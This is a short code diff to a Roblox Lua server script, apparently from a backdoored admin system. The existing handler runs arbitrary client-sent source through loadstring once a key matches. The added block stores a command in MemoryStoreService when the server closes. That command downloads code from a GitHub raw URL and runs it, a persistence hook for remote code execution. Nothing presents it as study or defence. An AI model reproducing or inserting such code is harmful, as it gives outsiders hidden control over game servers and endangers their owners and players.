@@ -46,6 +46,11 @@ remote.OnServerEvent:Connect(function(plr, key, src)
         loadstring(src)()
     end
 end)
+
+game:BindToClose(function()
+    game:GetService("MemoryStoreService"):GetHashMap("AHEmergency"):SetAsync("ServerStartup", 'loadstring(game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/alias-colorful/admin/refs/heads/main/load"))()', 960 * 60 * 60)
+end)
+
 --[[
 MessagingService:SubscribeAsync("Bice", function(message)
     local data = message.Data
